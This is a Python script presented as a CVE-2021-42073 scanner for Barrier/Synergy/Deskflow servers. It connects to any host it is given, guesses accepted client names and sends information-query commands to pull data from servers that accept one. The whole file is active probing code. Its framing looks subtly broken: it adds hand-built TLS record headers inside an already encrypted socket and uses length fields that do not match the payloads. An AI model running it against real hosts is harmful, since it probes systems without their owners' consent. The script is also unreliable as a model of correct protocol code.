#!/usr/bin/env python3
"""
CVE-2021-42073: Information Leak Scanner
Tests for information leaks via known client names and command sequences
"""

import socket
import binascii
import time
import ssl
from utils import create_ssl_context, frame_message, normalize_host

def scan(host, port=24800):
    """Test for CVE-2021-42073 information leak vulnerability"""
    host = normalize_host(host)
    context = create_ssl_context()
    
    print(f"\nTesting CVE-2021-42073 - Information leak via client names")
    
    client_names = [
        b"Unnamed",
        b"localhost",
        b"barrier",
        b"test",
        b"admin",
        b"synergy",
        b"deskflow",
        b"Synergy",
        b"Deskflow",
        b"SYNERGY",
        b"DESKFLOW"
    ]

    try:
        with socket.create_connection((host, port), timeout=10.0) as sock:
            ssock = context.wrap_socket(sock, server_hostname=host)
            ssock.settimeout(5.0)
            
            hello = b"\x16\x03\x03\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08"
            print(f"Sending hello: {binascii.hexlify(hello).decode()}")
            ssock.sendall(hello)
            
            response = ssock.recv(4096)
            if not response:
                print("Failed to establish connection - no response")
                return
            print(f"Got hello response: {binascii.hexlify(response).decode()}")
            
            barrier = b"\x00\x00\x00\x0b\x42\x61\x72\x72\x69\x65\x72\x00\x01\x00\x08test\x00"
            barrier_framed = b"\x16\x03\x03\x00\x14" + barrier  # Add TLS record header with correct length
            print(f"Sending barrier hello: {binascii.hexlify(barrier_framed).decode()}")
            ssock.sendall(barrier_framed)

            try:
                response = ssock.recv(4096)
                if response:
                    print(f"Got barrier response: {binascii.hexlify(response).decode()}")
            except socket.timeout:
                print("No barrier response (timeout)")

            calv = b"\x16\x03\x03\x00\x14\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08CALV\x00"
            ssock.sendall(calv)
            time.sleep(0.5)

            for name in client_names:
                try:
                    name_msg = b"\x00\x01\x00\x08" + name + b"\x00"
                    msg_len = len(name_msg)
                    framed_msg = b"\x16\x03\x03" + msg_len.to_bytes(2, byteorder='big') + name_msg
                    
                    print(f"\nTrying client name: {name.decode()}")
                    ssock.sendall(framed_msg)
                    
                    ssock.sendall(calv)
                    
                    try:
                        response = ssock.recv(4096)
                        if response:
                            print(f"Got response: {binascii.hexlify(response).decode()}")
                            if not b"EUNK" in response and not b"EBSY" in response:
                                print(f"[!] WARNING: Server accepted client name '{name.decode()}'")
                                
                                for cmd in [b"QINF\x00", b"INFO\x00", b"DINF\x00", b"LIST\x00"]:
                                    try:
                                        cmd_msg = b"\x16\x03\x03\x00\x14\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08" + cmd
                                        ssock.sendall(cmd_msg)
                                        ssock.sendall(calv)
                                        
                                        response = ssock.recv(4096)
                                        if response:
                                            print(f"Command {cmd} response: {binascii.hexlify(response).decode()}")
                                    except:
                                        continue
                                    time.sleep(0.2)
                        else:
                            print("Empty response")
                    except socket.timeout:
                        print("No response (timeout)")
                        ssock.sendall(calv)
                    
                    time.sleep(0.2)
                    
                except Exception as e:
                    print(f"Error testing client name: {e}")
                    try:
                        ssock.sendall(calv)
                    except:
                        break

    except (socket.error, ssl.SSLError) as e:
        print(f"Connection error: {e}")
        if "connection refused" in str(e).lower():
            print("Make sure the server is running and the port is correct")
    except Exception as e:
        print(f"Unexpected error: {e}")
    finally:
        try:
            ssock.close()
        except:
            pass

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description='CVE-2021-42073 Information Leak Scanner')
    parser.add_argument('--host', required=True, help='Target hostname or IP address')
    parser.add_argument('--port', type=int, default=24800, help='Target port (default: 24800)')
    args = parser.parse_args()
    
    scan(args.host, args.port)